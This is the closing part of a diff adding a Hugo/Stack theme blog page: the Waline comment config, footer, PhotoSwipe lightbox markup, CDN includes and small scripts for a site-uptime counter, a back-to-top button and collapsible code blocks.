+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bilibili","https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji","https://npm.elemecdn.com/@waline/emojis@1.1.0/weibo"],"lang":"zh-cn","locale":{"admin":"Admin","placeholder":null},"pageview":true,"placeholder":"欢迎评论，不好的评论我会删🙄💅🏻","requiredMeta":["name","email","url"],"serverURL":"https://comment.928330.xyz/"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 2025 - 2025 kakahuote | 引用请注明文章链接
+    </section>
+
+    <section class="running-time">
+        距离小站第一行代码被置下已经过去
+        <span id="runningdays" class="running-days"></span>    
+    </section>
+
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计 <br />
+
+        <span>...当然还有kakahuote🤓👆</span>
+    </section>
+</footer>
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+     
+     
+    @font-face {
+     font-family: 'yuan';  
+     src: url(https://blog.928330.xyz/font/round.ttf) format('truetype');  
+    }
+
+     
+     
+     
+    :root {
+     --base-font-family: 'yuan';  
+     --code-font-family: 'yuan';  
+      
+    }
+
+     
+
+     
+     
+     
+    #backTopBtn {
+     position: fixed;  
+     bottom: 30px;  
+     right: 450px;  
+     z-index: 99;  
+     cursor: pointer;  
+     width: 30px;  
+     height: 30px;  
+     background-image: url(https://blog.928330.xyz/icons/backTop.svg);  
+     background-size: cover;  
+     transition: transform 0.1s linear;  
+     transform-origin: center center;  
+    }
+
+    #backTopBtn.rotating {
+     transform: rotate(360deg);  
+    }
+
+     
+     
+     
+    .highlight {
+      
+     max-height: 400px;  
+     overflow: hidden;  
+     position: relative;  
+     transition: max-height 0.3s ease-out;  
+    }
+
+    .code-show {
+     max-height: none !important;  
+    }
+
+    .code-more-box {
+     width: 100%;  
+     padding-top: 20px;  
+     background-image: linear-gradient(to bottom, rgba(255, 255, 255, 0), #fff);  
+     position: absolute;  
+     left: 0;
+     right: 0;
+     bottom: 0;
+     z-index: 1;  
+     text-align: center;  
+    }
+
+    .code-more-btn {
+     display: inline-block;  
+     padding: 5px 15px;  
+     background: #f0f0f5;  
+     border-radius: 5px;  
+     cursor: pointer;  
+     font-size: 0.9em;  
+    }
+   </style>
+
+   <script>
+     
+     
+     
+
+    let s1 = '2025-5-8 15:00:00'; 
+    s1 = new Date(s1.replace(/-/g, "/"));
+    let s2 = new Date();
+    let timeDifference = s2.getTime() - s1.getTime();
+
+    let days = Math.floor(timeDifference / (1000 * 60 * 60 * 24));
+    let hours = Math.floor((timeDifference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    let minutes = Math.floor((timeDifference % (1000 * 60 * 60)) / (1000 * 60));
+
+    let result = days + "天" + hours + "小时" + minutes + "分钟";
+    if (document.getElementById('runningdays')) {
+        document.getElementById('runningdays').innerHTML = result;
+    }
+    
+     
+     
+     
+    
+
+    function initScrollTop() {
+     let rightSideBar = document.querySelector(".right-sidebar");
+     if (!rightSideBar) {
+      return;
+     }
+
+     
+     let btn = document.createElement("div");
+     btn.id = "backTopBtn";
+     let isRotating = false; 
+
+     btn.onclick = function() {
+      if (!isRotating) {
+       isRotating = true;
+       backToTop(this, () => {
+        isRotating = false; 
+       });
+      }
+     };
+     rightSideBar.appendChild(btn);
+
+     
+     btn.style.display = "block";
+    }
+
+    
+
+    function backToTop(button, onComplete) {
+     let rotation = 0;
+     let animationInterval;
+
+     window.scrollTo({ top: 0, behavior: "smooth" }); 
+
+     animationInterval = setInterval(() => {
+      rotation += 30; 
+      button.style.transform = `rotate(${rotation}deg)`;
+
+      if (window.scrollY === 0) {
+       clearInterval(animationInterval); 
+       button.style.transform = `rotate(0deg)`; 
+       if (onComplete) {
+        onComplete();
+       }
+      } else if (rotation >= 360 && window.scrollY !== 0) {
+       
+      }
+     }, 20); 
+    }
+
+    
+    initScrollTop();
+    
+    
+
+
+     
+     
+     
+    function initCodeMoreBox() {
+     let codeBlocks = document.querySelectorAll(".highlight");
+     if (!codeBlocks) {
+      return;
+     }
+     codeBlocks.forEach(codeBlock => {
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+       return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.innerText = '显示更多'; 
+      let isExpanded = false; 
+
+      codeMoreBtn.addEventListener('click', () => {
+       if (!isExpanded) {
+        codeBlock.classList.add('code-show'); 
+        codeMoreBtn.innerText = '折叠'; 
+        isExpanded = true;
+       } else {
+        codeBlock.classList.remove('code-show'); 
+        codeMoreBtn.innerText = '显示更多'; 
+        isExpanded = false;
+       }
+       
+       window.dispatchEvent(new Event('resize'));
+      });
+      
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox);
+     });
+    }
+
+    initCodeMoreBox();
+   </script>
+    </body>
+</html>
